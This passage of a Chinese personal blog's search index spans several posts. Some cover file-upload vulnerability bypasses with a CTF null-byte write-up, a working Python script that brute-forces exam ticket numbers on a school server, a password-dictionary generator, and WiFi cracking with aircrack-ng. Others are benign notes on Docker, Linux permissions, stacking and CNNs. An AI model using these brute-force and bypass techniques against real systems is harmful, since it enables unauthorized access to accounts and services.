    <url>%2F2020%2F05%2F13%2F20200513-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[大数据和人工智能是分不开的； 总结相关mapreduce技术等；]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>BigData</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2020%2F05%2F10%2F20200510-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[简单总结一下文件上传漏洞的一些绕过姿势与防御； 题库：https://github.com/c0ny1/upload-labs 综述：Webshell研究综述-阿里云能力建设团队 0x00 漏洞简介存在条件 存在上传点 可以上传动态文件 上传目录有执行权限，并且上传的文件可执行 可访问到上传的动态文件 0x01 基本姿势 基本的服务端检测包括MIME检测等，此类可以通过抓包修改等简单绕过 内容过滤，可以考虑copy命令合并图片和脚本 强混淆 https://github.com/sunge/Weevely Webshell收集项目 https://github.com/tennc/webshell 多个filename 目录穿越 ../../../ .././.././../ (./是为了防止../../被过滤) 解析漏洞 首先根据指纹确定中间件的版本 确定是否存在00阶段类型的漏洞 0x02 高级姿势 重绘图 找到不被转换的部分 https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE 文件包含与PHPINFO https://github.com/hxer/vulnapp.git 在线解压缩漏洞 webshell解压到网站目录（可使用../目录穿越） 文件软链接的方式，将根目录等敏感目录软连接到自己的文件，之后将软链接压缩上传 0x03 防御 0x04 一些CTF题目4-1 weekly-ctf-07 00截断首先，这个问题的难点在于不只是后缀验证一次， 上传的时候必须是jpg png gif，就是下图的灰色箭头；content-type倒是不重要 红色箭头的路径会和你的文件名进行一次拼接，拼接之后再进行一次检测，这次要求你必须是php后缀 所以解决办法只能是让地址生效，拼接后后面的地方失效 这个题的重点在于这个文件路径是可控的 那关键点就在这儿了，如何操作让a.php后边拼接部分失效呢，最简单的就是最流行的00截断法，这个要在16进制界面更改，下图2 这一行的0d 0a是什么意思呢 所以要留空，留一个字符，可以是空格等 只需要把留空的字符改为00，forward一下就可以出flag了 4-2 任意上传 JS形式一句话 菜刀使用 参考资料 Webshell研究综述-阿里云能力建设团队 关于00截断原理的一些思考 利用htaccess绕黑名单，mail绕过disable function 文件包含漏洞(绕过姿势) 文件上传之黑名单验证绕过]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>Sec</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 权限简析]]></title>
    <url>%2F2020%2F04%2F08%2F20200408-Linux-%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[基本原理 加权限 chmod u+rwx,g+rwx,o+rwx file 减权限 chmod u+rwx,g+rwx,o+rwx file a代表u+g+o，chmod a+rwx file + 表示增加权限、- 表示取消权限、= 表示唯一设定权限。 其他参数 -c : 若该文件权限确实已经更改，才显示其更改动作 -f : 若该文件权限无法被更改也不要显示错误讯息 -v : 显示权限变更的详细资料 -R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递归的方式逐个变更) —help : 显示辅助说明 —version : 显示版本 ALL 文件所有者 用户组 其它用户 a u g o all user group other 特殊权限 rwx 读写执行 … X 特殊执行权限 只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行 s setuid/gid 当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限 t 粘贴位 设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位 查看权限 ls -la 第一位 d 代表文件夹 ./ 代表当前目录 ../代表父目录 八进制 快捷表示 根据 3位 二进制 来一一对应 # 权限 rwx 二进制 7 读 + 写 + 执行 rwx 111 6 读 + 写 rw- 110 5 读 + 执行 r-x 101 4 只读 r— 100 3 写 + 执行 -wx 011 2 只写 -w- 010 1 只执行 —x 001 0 无 —- 000 777 : rwxrwxrwx : ugo (a) 755 : rwx 实际操作 参考链接 Linux chmod命令 inode-wiki]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>Sec</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次准考证号“爆破”以及另一次密码爆破]]></title>
    <url>%2F2020%2F03%2F20%2F20200320-%E5%87%86%E8%80%83%E8%AF%81%E5%8F%B7%E2%80%9C%E7%88%86%E7%A0%B4%E2%80%9D%E2%80%94%E2%80%94%E8%A7%A3%E5%86%B3%E5%BF%98%E8%AE%B0%E5%87%86%E8%80%83%E8%AF%81%E5%8F%B7%E6%97%A0%E6%B3%95%E6%9F%A5%E8%AF%A2%E8%80%83%E7%A0%94%E5%88%9D%E5%A7%8B%E6%88%90%E7%BB%A9%EF%BC%88%E6%A0%A1%E5%AE%98%E7%BD%91%EF%BC%89%2F</url>
    <content type="text"><![CDATA[解决忘记准考证号无法查询考研初始成绩，解决强密码忘记密码且无法重制； 考研查成绩阶段，很多同学跟我说忘记准考证号了； 所以找了一个接口，进行了简单的爆破匹配； 找到了一个当时用来查考场的网页，一般像这种只实现简单功能的小网页安全性都较差； 这个就不例外，没有次数限制，没有验证码校验，所以可以直接循环提交表单进行爆破。 想要查询的同学只需要提供身份证号即可，根据大致的准考证号的范围进行逐个爆破，根据返回内容的长度等判断是否爆破成功。简单的代码示例放在最后。 另一个密码爆破！ 由于学校要求弱密码全部改为强密码，kang同学自信的改为了很复杂的密码，而且不放心chrome，不让其记住密码；结果就是，忘记了；到查成绩的时候发现无法重置密码； 好在同样的强密码用在了很多地方，其中一个图书馆网站没有开启验证码校验，存在爆破可能。 所以根据kang同学回忆，提取了几个可能的关键词，因为强密码要求大小写字母、数字、特殊符号同时存在，所以构建排列组合，获取到了用于爆破的字典。 搞过密码爆破的其实都知道，最重要的就是字典，字典里没有，再爆破也没用。 好在kang同学回忆的关键词比较全，最终用类似的方法爆破到了密码。最后会放一个构建字典的简单代码。 准考证爆破简单示例代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from urllib import request,parsefrom html.parser import HTMLParserimport urllibglobal flagdef logon(testID,IDcard): PostUrl = 'http://***.58.***.71:8088/zskc/checklogin' testID = testID#构建登录data login_data = parse.urlencode([ ('bkType', 'now'), ('zkzh', testID), ('sfzh', IDcard), ]) req = request.Request(PostUrl)#构建登录head 请求头 req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'), req.add_header('Accept-Encoding', 'gzip, deflate'), req.add_header('Accept-Language', 'zh-CN,zh;q=0.9,en;q=0.8'), req.add_header('Cache-Control', 'max-age=0'), req.add_header('Connection', 'keep-alive'), req.add_header('Content-Length', '55'), req.add_header('Content-Type', 'application/x-www-form-urlencoded'), req.add_header('Cookie', 'JSESSIONID=1A5F7DD34539699E9EC7CB7298745713'), req.add_header('Host', '***.58.***.71:8088'), req.add_header('Origin', 'http://***.58.***.71:8088'), req.add_header('Referer', 'http://***.58.***.71:8088/zskc/'), req.add_header('Upgrade-Insecure-Requests', '1'), req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'), with request.urlopen(req,data=login_data.encode('utf-8')) as f: if f.read().decode('GBK').find('alert')==-1: global flag flag = 1 print(f.read().decode('GBK')) print("准考证号为："+testID) return(f.read().decode('GBK'))def main(): idcard = input("请输入要查询的身份证号：") mi,mx = input("请输入准考证号后四位的范围（10424953000****）：").split() for i in range(int(mi), int(mx)): global flag flag = 0 a = '10424953000' a = a + str('%04d' % i) logon(a,idcard) del a if flag == 1: breakif __name__ == '__main__': main() 构建字典的简单代码12345678910111213141516171819202122232425262728293031323334# dictimport numpy as nppw_01 = []pw_02 = []pw_03 = []pw_04 = []all_list = []for i in pw_01: for j in pw_02: for k in pw_03: all_list.append(i+j+k) all_list.append(i+k+j) all_list.append(k+i+j) all_list.append(k+j+i) all_list.append(j+i+k) all_list.append(j+k+i) # print(i+j+k)for i in pw_02: for j in pw_03: for k in pw_04: all_list.append(i+j+k) all_list.append(i+k+j) all_list.append(k+i+j) all_list.append(k+j+i) all_list.append(j+i+k) all_list.append(j+k+i)# print(all_list)with open('student.txt',mode='w') as f: for i in all_list: f.write(i+'\n')]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>Sec</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 总结]]></title>
    <url>%2F2020%2F02%2F07%2F20200207-docker%2F</url>
    <content type="text"><![CDATA[之前大体上玩儿过，但是一直没有完整的使用过；这次借着天池的一个新人赛 【入门】Docker练习场，梳理了一下docke的基本操作。 window下docker解决方案 docker对于unix是比较友好的，无需累述；docker在windows下一直没有好的解决方案，今天花了一天的时间终于找到了最好的解决方案，并且完成了比赛。 的目前为止最好的解决方案还是docker for windows，之前的解决方案可能是VM、或者win10子系统WSL里的docker，wsl虽然很方便也有方法能起来docker，但是很容易碰见这样那样的问题，docker守护进程方面很难弄。之所以说docker for windows是最好的解决方案是因为他的新版本解决了对于hyper-v的依赖，使得他自己与VM等不会发生冲突，这就解决了他之前最大的弊端，使用起来没有复杂的障碍与冲突。详细的进步在知乎：Windows下想使用Linux环境，WSL、Docker、VM应该怎么选择？。 windows下安装也很简单，Welcome to Docker Hub: Download and Take a Tutorial。 记得开启docker的镜像加速，不然下载镜像会很慢，可以使用阿里云的加速，阿里云加速链接。 常用命令 命令 操作 docker images 查看已存在镜像 docker ps 查看正在运行的容器 docker ps -a 查看所有容器 docker run -it [打包的镜像名称]:[tag] bash 启动镜像 docker commit -a “dyngq” -m “test” [容器名称或id] [打包的镜像名称]:[tag] 将容器打包成镜像 docker rm 删除容器 docker rmi 删除镜像 docker bulid -t [打包的镜像名称]:[tag] 根据Dockerfile打包镜像 docker start 启动容器 docker attach 进入容器 将容器打包成镜像docker commit -a “dyngq” -m “test” [容器名称或id] [打包的镜像名称]:[tag] -a :提交的镜像作者；-c :使用Dockerfile指令来创建镜像；-m :提交时的说明文字；-p :在commit时，将容器暂停。 Dockerfile示例Dockfile # Base Images ## 从带有numpy的python镜像 FROM numpy:1.0 ## 把当前文件夹里的文件构建到镜像的根目录下 ADD . / ## 指定默认工作目录为根目录（需要把run.sh和生成的结果文件都放在该文件夹下，提交后才能运行） WORKDIR / ## 镜像启动后统一执行 sh run.sh CMD [&quot;sh&quot;, &quot;run.sh&quot;] 其他一些常用参考链接 菜鸟教程的docker教学 docker如何部署您的第一个应用程序 pass 天池 手把手超详细操作说明 创建阿里云的docker仓库 pull拉取提供的python3镜像 启动镜像，在这个容器内安装numpy ( pip install numpy -i https://pypi.tuna.tsinghua.edu.cn/simple) 将安装有numpy的容器打包成镜像 写好Dockerfile，写好sh和py push上去 提交结果 本次提交的所有文件都在./docker文件夹内 py文件 # import pandas as pd import numpy as np import json # df = pd.read_csv(&quot;/tcdata/num_list.csv&quot;) # df = pd.read_csv(&quot;./docker/tianchi_submit_demo/data/tcdata/num_list.csv&quot;) # print(df) numbers = np.loadtxt(open(&quot;./tcdata/num_list.csv&quot;,&quot;rb&quot;),delimiter=&quot;,&quot;,skiprows=0,dtype=&#39;int&#39;) # numbers = np.loadtxt(open(&quot;./docker/tianchi_submit_demo/data/tcdata/num_list.csv&quot;,&quot;rb&quot;),delimiter=&quot;,&quot;,skiprows=0,dtype=&#39;int&#39;) # numbers = np.random.randint(1,30,size=50,dtype=&#39;int32&#39;) # print(numbers) # np.savetxt(&#39;./docker/tianchi_submit_demo/data/tcdata/num_list.csv&#39;, numbers,delimiter = &#39;,&#39;) # print(&quot;hello_world&quot;) # print(numbers,type(numbers.tolist())) r_sum = np.sum(numbers) top10 = numbers[np.argpartition(numbers,-10)[-10:]] top10 = np.sort(top10).tolist() top10.reverse() # print(top10, type(top10)) result = { &quot;Q1&quot;: &quot;Hello world&quot;, &quot;Q2&quot;: r_sum.tolist(), # C004 注意：TOP10 若包含重复值 &quot;Q3&quot;: top10 } with open(&quot;result.json&quot;, &quot;w&quot;) as f: json.dump(result, f)]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>Sec</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[试着破解一下wifi密码]]></title>
    <url>%2F2019%2F09%2F16%2F20190916-%E8%AF%95%E7%9D%80%E7%A0%B4%E8%A7%A3%E4%B8%80%E4%B8%8Bwifi%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[刚来实验室，问到实验室的2.4g频段wifi密码，但是5g频段密码没人知道。 过程最大的问题 网卡问题，很多旧方法需要旧设备，但旧设备没法识别5g频段网络。 VMware虚拟机里的很难识别网卡，很难进行桥接，扫不到无线网络。 win10的WSL里的ubuntu或者kali等可以是被wifi0，但是无法监听。 原来旧电脑的安装了Ubuntu双系统，但是网卡太老检测不到5g信号。 最后制作了一个简单的Ubuntu18.04的U盘启动，通过Ubuntu live暂时使用unix系统进行监听和攻击。 整体进程 基本上按照kali(aircrack-ng)破解wifi的思路 参考链接:Aircrack-ng破解无线WIFI密码 我的步骤基本上和这个是一样的，因为是在临时的live ubuntu上弄的，没有截图写笔记，只是导出了最后有用的cap文件，所以不再累述。 有一个地方需要注意，那就是单纯的检测一般不会检测到5g频段，需要在airmon-ng的时候加入频率参数，sudo airodump-ng -C 5180-5825 wlo1mon。并且实践发现只需要加一次即可，之后的任何命令都可以侦测到5g频段。参考链接:解决airodump-ng工具无法搜索5GHz频段的方法 …… 但是根本没有人连接这个5g频段的wifi，自然没法对用户进行攻击抓握手包，卡主。。。 吃饭回来突然想起来之前的192.168.0.1只是自己猜出来的，所以又看了一遍默认网关，发现默认网关错了，其实是192.168.5.1。。。。。。。。登陆。。。。使用admin默认密码。。。成功。。。。。果然除了我没人用5g频段，飙起 但是不能就这么完了呀，弄了挺长时间的，不甘心啊。。。 于是 用自己手机连上！ 攻击自己手机！ 结果又尴尬了，攻击一直失败，才了解到现在很多设备早就能够抵御这种攻击了。。。 所以，主动下线，，，上线，，，相当于很配合的提供了握手包。。]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>Sec</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器搭建博客总结]]></title>
    <url>%2F2019%2F07%2F22%2F20190722-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[记录一下搭建和迁移等，目前已经迁移到阿里云＋阿里云OSS上 很多人都有自己的博客，只有Github的话不够美观直接，建立博客也是熟悉服务器的一个过程。 因为之前搭建过，由于灵越3543上自用的Ubuntu上软件依赖混乱缺失了很多，无法安装SSH服务等，所以直接格式化了，扩大了空间，重装了系统；所以需要将原来的Hexo博客及逆行转移，之后进行了更详细的优化，购买了域名等等。 阿里云ECS+OSS （2020更新方案） Nginx反向代理，强制https访问，80端口重定向443端口 参考链接：Nginx的https配置记录以及http强制跳转到https的方法梳理 服务器上搭建git服务，并通过钩子钩到相应的搭建好环境的文件夹 OSS利用typora的图片上传功能直接上传到图床，并且自动修改为可访问的超链接 每次部署可以同步推送到服务器、GitHub、Codeing等 dyngq.topA. 使用了Hexo博客 因为搭建简单，而且可以借助Github Pages进行发布，不需要另外购买需要一直开启的服务器，在原来的3543机器上就可以完成搭建与发布，类似于服务器但是不需要每时每刻都开启。 最初的搭建很简单，有很详细的官方配置介绍。 git安装hexo或者直接将文件夹需要的部分复制过来 安装node.js 相关部署配置等 B. 域名 域名在阿里云购买了.top域名，首年9块钱，续费每年29块钱，还可以。 域名包含简单的解析服务，需要对Pages服务和域名解析控制台都配置一下域名解析。 ping一下网址就可以得到ip，小常识 C. 主题 主题的选择有很多 主题配置 next主题配置文档链接 D. 动态背景动画 需要git clone一个库，否则不会生效 E. 杂七杂八的配置很多 根据自己需要来，需要的时候再配置就可以了。 F. 搭建CDN加速（舍弃）G. 选择双仓库多解析 如果是直接在服务器上运行hexo服务的话就不需要，这一条这上一条的CDN搭建的目的原因都是因为，百度无法爬取Github Pages的页面，Google无法访问阿里DNS解析的dns3.hichina.com, dns4.hichina.com服务器，所以无法完成搜索引擎的收录工作。 谷歌收录软件（Google Search Console）无法访问www.dyngq.top但是最后完成了对dyngq.top的网站地图sitemap的提交，有点意外，应该不是无法访问服务器的缘故，说不清楚，还待研究 google和百度的收录应该都搞定了，问题关键在于不要加www. 不管怎么样，提交的链接想尽办法不要加www.，直接http://dyngq.top就可以了]]></content>
      <categories>
        <category>dyngq</category>
      </categories>
      <tags>
        <tag>dyngq</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Stacking 模型融合]]></title>
    <url>%2F2019%2F07%2F21%2F20190721-%E6%A8%A1%E5%9E%8B%E8%9E%8D%E5%90%88%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%89%EF%BC%89stacking%2F</url>
    <content type="text"><![CDATA[1.介绍一下stacking的原理等 2.机器学习算法进行stacking很常见，像mlxtend等库对stacking算法封装还不错 3.简单实现一下神经网络的stacking算法 最经典的一张图: 但是可以不从这个图开始理解，这个图是一个表较复杂，比较不容易过拟合的一种复杂实现，理解stacking更重要的是理解stacking总体的思想。由浅入深，先从整体上把握，再针对不同的情境复杂优化。 stacking算法基于一个简单的思想，与其使用一些平凡的函数（比如硬投票）来聚合集成所有模型预测，那为什么不训练一个模型来执行这些聚合呢。 总体概述： stacking原则上可以分成若干层级，但层数多不一定效果越好，一般采用两层结构。 因此，我们可以把stacking过程看作是两个级别，级别0和级别1。 0级: 也就是对应第一层，0级模型就是我们需要堆叠的多个模型，也称为预测器。可以是随机森林SVM等等多种模型，也可以只有一种模型。对这些模型在训练集上进行正常训练。 1级: 也就是对应第二层，1级模型称为混合器或元学习器（blender, or a meta learner）。混合器的训练集的输入特征（x）是上一层多个预测器的预测值的拼接，混合器的训练集的预测值（y）就是训练集原来的预测值（y）。 stacking一般采用预留集的方法训练1级模型（元学习器），如图所示，训练集被拆分为2部分（注意，这里不是要几折也不是要拆分成训练集验证集测试集），子集1正常训练模型，得到n个预测器。让刚刚得到的n个预测器在预留集（子集2）上进行预测，（由于之前一直没有见过子集2里的数据，所以可以确保预测是干净的），这样就得到了n个预测值。将这些预测值作为输入特征，创建一个新的训练集（n维），保留原来的label作为label，在这个新的训练集上训练1级模型（元学习器/混合器），让它学习使用预测器的预测来预测目标值。 当然，就像之前说的，stacking可以有多层，比如三层。 第一层是预测器，第二层是多个混合器（混合器可以有多种，随机森林、线性回归等等），第三层是又一层的混合器。 这是就需要讲训练集分成三部分，在三层上“干净的”训练。 原理如下图： 常见的stacking方法解释 第二部分：下面是网上最常见的stacking方法解释(也就是文章已开始的图片所描述的) (神经网络的stacking应用在下一部分) 一种更为复杂的方法是使用k-fold交叉验证来开发元学习机模型的训练数据集，也就是对应一开始的那张图片。每个0级模型预测器都使用k-fold交叉验证(甚至为了达到最大效果使用留一法交叉验证)进行训练;然后模型被丢弃，但是预测被保留。这意味着对于每个模型，都有一个模型版本所做的预测，而这个版本的模型并没有针对这些例子进行训练，例如，有一些在预留的例子。 关于K折交叉验证 下面是比较好最普遍的解释（来自网上，文末链接）： 对于每一轮的 5-fold，Model 1都要做满5次的训练和预测。Titanic 栗子：Train Data有890行。(请对应图中的上层部分）每1次的fold，都会生成 713行 小train， 178行 小test。我们用Model 1来训练 713行的小train，然后预测 178行 小test。预测的结果是长度为 178 的预测值。这样的动作走5次！ 长度为178 的预测值 X 5 = 890 预测值，刚好和Train data长度吻合。这个890预测值是Model 1产生的，我们先存着，因为，一会让它将是第二层模型的训练来源。重点：这一步产生的预测值我们可以转成 890 X 1 （890 行，1列），记作 P1 (大写P)接着说 Test Data 有 418 行。(请对应图中的下层部分，对对对，绿绿的那些框框）每1次的fold，713行 小train训练出来的Model 1要去预测我们全部的Test Data（全部！因为Test Data没有加入5-fold，所以每次都是全部！）。此时，Model 1的预测结果是长度为418的预测值。这样的动作走5次！我们可以得到一个 5 X 418 的预测值矩阵。然后我们根据行来就平均值，最后得到一个 1 X 418 的平均预测值。重点：这一步产生的预测值我们可以转成 418 X 1 （418行，1列），记作 p1 (小写p)走到这里，你的第一层的Model 1完成了它的使命。第一层还会有其他Model的，比如Model 2，同样的走一遍， 我们有可以得到 890 X 1 (P2) 和 418 X 1 (p2) 列预测值。这样吧，假设你第一层有3个模型，这样你就会得到：来自5-fold的预测值矩阵 890 X 3，（P1，P2， P3） 和 来自Test Data预测值矩阵 418 X 3， （p1, p2, p3）。 到第二层了………………来自5-fold的预测值矩阵 890 X 3 作为你的Train Data，训练第二层的模型来自Test Data预测值矩阵 418 X 3 就是你的Test Data，用训练好的模型来预测他们吧。 最后 ，放出一张Python的Code，在网上为数不多的stacking内容里， 这个几行的code你也早就看过了吧，我之前一直卡在这里，现在加上一点点注解，希望对你有帮助： 第三部分：神经网络的stacking 有一篇专门的英文博客介绍了传统机器学习以及神经网络的stacking，文末链接。 做了京东评论的情感分析，尝试使用了stacking。 后来毕业设计老师建议使用英文数据集，相对于中文噪声小等，所以以后还会尝试在IMDB和Twitter数据集上的复杂神经网络模型上进行stacking。 参考资料： 1.最完整的，包括深度学习 中文译文：https://blog.csdn.net/LaoChengZier/article/details/86504464 英文原版：https://machinelearningmastery.com/stacking-ensemble-for-deep-learning-neural-networks/ 2.https://www.leiphone.com/news/201709/zYIOJqMzR0mJARzj.html 3.https://blog.csdn.net/willduan1/article/details/73618677 4.]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>Ensemble</tag>
        <tag>Stacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[卷积神经网络 - Convolutional Neural Network- CNN]]></title>
    <url>%2F2019%2F07%2F21%2F20190721-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%20-%20Convolutional%20Neural%20Network-%20CNN%2F</url>
    <content type="text"><![CDATA[0x01 应用场景： 卷积神经网络是用于计算机视觉任务的最佳机器学习模型。即使在非常小的数据集上也可以从头开始训练一个卷积神经网络，而且得到的结果还不错。 用于图像分类问题。数据集越大越好（保证质量的前提下），但是CNN可以处理那些训练集较小的问题 组成：卷积层 池化层 它的人工神经元可以响应一部分覆盖范围内的周围单元，对于大型图像处理有出色表现。它包括卷积层和池化层。此外一般还有需要分类器，在预训练中一般会冻结卷积基（卷积+池化），通过调节训练分类器实现在小规模数据集上的训练精度提高。 一般用最大池化层，原因在于特征中往往编码了某种模式或概念在特征图的不同位置是否存在（因此得名特征图），而观察不同特征的最大值而不是平均值能够给出更多的信息。 卷积层不同点 密集连接层和卷积层的根本区别在于， Dense 层从输入特征空间中学到的是全局模式，而卷积层学到的是局部模式。图像可以被分解为局部模式，如边缘、纹理等。 0x02 卷积神经网络具有两个有趣的性质 平移不变性 卷积神经网络学到的模式具有平移不变性（translation invariant）。 卷积神经网络在图像右下角学到某个模式之后，它可以在任何地方识别这个模式，比如左上角。 这使得卷积神经网络在处理图像时可以高效利用数据（因为视觉世界从根本上具有平移不变性），它只需要更少的训练样本就可以学到具有泛化能力的数据表示。 CNN可以学到模式的空间层次结构 第一个卷积层将学习较小的局部模式（比如边缘），第二个卷积层将学习由第一层特征组成的更大的模式，以此类推。 这使得卷积神经网络可以有效地学习越来越复杂、越来越抽象的视觉概念（因为视觉世界从根本上具有空间层次结构）。 0x03 特征图 3D张量（高度宽度通道数）的卷积也叫特征图 含义：深度轴的每个纬度都是一个特征（或者说是过滤器） 卷积运算，输入特征图，从输入特征图中提取图块，并对所有这些图块应用相同的变换，生成输出特征图 该输出特征图仍是一个 3D 张量，具有宽度和高度，其深度可以任意取值，因为输出深度是层的参数，深度轴的不同通道不再像 RGB 输入那样代表特定颜色，而是代表过滤器（filter）。过滤器对输入数据的某一方面进行编码。 0x04 卷积由两个关键参数所定义 从输入中提取的图块尺寸,通常是 3×3 或 5×5. 输出特征图的深度：卷积所计算的过滤器的数量。 0x0501 卷积的工作原理 在 3D 输入特征图上滑动（slide）这些 3×3 或 5×5 的窗口，在每个可能的位置停止并提取周围特征的 3D 图块［形状为 (window_height, window_width, input_depth) ］。 然后每个3D 图块与学到的同一个权重矩阵［叫作卷积核（convolution kernel）］做张量积，转换成形状为 (output_depth,) 的 1D 向量。 然后对所有这些向量进行空间重组，使其转换为形状为 (height, width, output_depth) 的 3D 输出特征图。 输出特征图中的每个空间位置都对应于输入特征图中的相同位置（比如输出的右下角包含了输入右下角的信息）。 输出的宽度和高度可能与输入的宽度和高度不同。不同的原因可能有两点。 边界效应，可以通过对输入特征图进行填充来抵消。 使用了步幅（stride）。卷积步幅，步进卷积。 Gif动图说明。 02 添加非线性激活ReLU（修正线性单元）层 在每个卷积层之后，通常会立即应用一个非线性层（或激活层）。其目的是给一个在卷积层中刚经过线性计算操作（只是数组元素依次（element wise）相乘与求和）的系统引入非线性特征。过去，人们用的是像双曲正切和 S 型函数这样的非线性方程，但研究者发现 ReLU 层效果好得多，因为神经网络能够在准确度不发生明显改变的情况下把训练速度提高很多（由于计算效率增加）。它同样能帮助减轻梯度消失的问题——由于梯度以指数方式在层中消失，导致网络较底层的训练速度非常慢。ReLU 层对输入内容的所有值都应用了函数 f(x) = max(0, x)。用基本术语来说，这一层把所有的负激活（negative activation）都变为零。这一层会增加模型乃至整个神经网络的非线性特征，而且不会影响卷积层的感受野。（参见 Geoffrey Hinton（即深度学习之父）的论文：Rectified Linear Units Improve Restricted Boltzmann Machines） 此部分参考链接 03 感受野 感受野 常用一种特殊方法，如下图右边一列所示，卷积之后位置不变，空白部分进行填充的方法。 而感受野就是右列的 以每一个实体位置为中心 对应的输入图的信息映射的包含的部分。 参考链接,对CNN感受野一些理解 04 特征图和感受野二维卷积层输出的二维数组可以看作是输入在空间维度（宽和高）上某一级的表征，也叫特征图（feature map）。影响元素xx的前向计算的所有可能输入区域（可能大于输入的实际尺寸）叫做xx的感受野（receptive field）。以图5.1为例，输入中阴影部分的四个元素是输出中阴影部分元素的感受野。我们将图5.1中形状为2×22×2的输出记为YY，并考虑一个更深的卷积神经网络：将YY与另一个形状为2×22×2的核数组做互相关运算，输出单个元素zz。那么，zz在YY上的感受野包括YY的全部四个元素，在输入上的感受野包括其中全部9个元素。可见，我们可以通过更深的卷积神经网络使特征图中单个元素的感受野变得更加广阔，从而捕捉输入上更大尺寸的特征。 我们常使用“元素”一词来描述数组或矩阵中的成员。在神经网络的术语中，这些元素也可称为“单元”。当含义明确时，本书不对这两个术语做严格区分。 0x06 最大池化 在每个 MaxPooling2D 层之后，特征图的尺寸都会减半。 最大池化的作用：对特征图进行下采样，与步进卷积类似。 使用下采样的原因 一是减少需要处理的特征图的元素个数 二是通过让连续卷积层的观察窗口越来越大（即窗口覆盖原始输入的比例越来越大），从而引入空间过滤器的层级结构。 0x07 在小型数据集上从头开始训练一个卷积神经网络 数据集越大一般相对越好，只用几十个样本训练卷积神经网络就解决一个复杂问题是不可能的，但如果模型很小，并做了很好的正则化，同时任务非常简单，那么几百个样本可能就足够了。 讨论猫狗图像分类，数据集中包含 4000 张猫和狗的图像（2000 张猫的图像，2000 张狗的图像）。我们将 2000 张图像用于训练，1000 张用于验证，1000张用于测试。 模型 可以看到： 由于边界效应：每个卷积层之后，就减少两行两列 由于最大池化，每个池化层之后，缩小为原来的一半 数据预处理 读取图像文件。 将 JPEG 文件解码为 RGB 像素网格。 将这些像素网格转换为浮点数张量。 将像素值（0~255 范围内）缩放到 [0, 1] 区间（神经网络喜欢处理较小的输入值）。 Keras 拥有自动完成这些步骤的工具，它包含ImageDataGenerator 类，可以快速创建 Python 生成器，能够将硬盘上的图像文件自动转换为预处理好的张量批量。 训练好模型后，保存模型 通过可视化两个图像 训练精度和验证精度 和 训练损失和验证损失，发现第几轮开始过拟合。 因为训练样本相对较少（2000 个），所以过拟合是最关心的问题。 0x08 互相关运算 深度度学习中的卷积运算实际上是互相关运算是个面试题考点 import torch from torch import nn def corr2d(X, K): # 本函数已保存在d2lzh_pytorch包中方便以后使用 h, w = K.shape Y = torch.zeros((X.shape[0] - h + 1, X.shape[1] - w + 1)) for i in range(Y.shape[0]): for j in range(Y.shape[1]): Y[i, j] = (X[i: i + h, j: j + w] * K).sum() return Y 0x09 二维卷积层二维卷积层将输入和卷积核做互相关运算，并加上一个标量偏差来得到输出。卷积层的模型参数包括了卷积核和标量偏差。在训练模型的时候，通常我们先对卷积核随机初始化，然后不断迭代卷积核和偏差。 下面基于corr2d函数来实现一个自定义的二维卷积层。在构造函数init里我们声明weight和bias这两个模型参数。前向计算函数forward则是直接调用corr2d函数再加上偏差。 class Conv2D(nn.Module): def __init__(self, kernel_size): super(Conv2D, self).__init__() self.weight = nn.Parameter(torch.randn(kernel_size)) self.bias = nn.Parameter(torch.randn(1)) def forward(self, x): return corr2d(x, self.weight) + self.bias 卷积窗口形状为p×qp×q的卷积层称为p×qp×q卷积层。同样，p×qp×q卷积或p×qp×q卷积核说明卷积核的高和宽分别为pp和qq。 深度度学习中的卷积运算实际上是互相关运算实际上，卷积运算与互相关运算类似。为了得到卷积运算的输出，我们只需将核数组左右翻转并上下翻转，再与输入数组做互相关运算。可见，卷积运算和互相关运算虽然类似，但如果它们使用相同的核数组，对于同一个输入，输出往往并不相同。 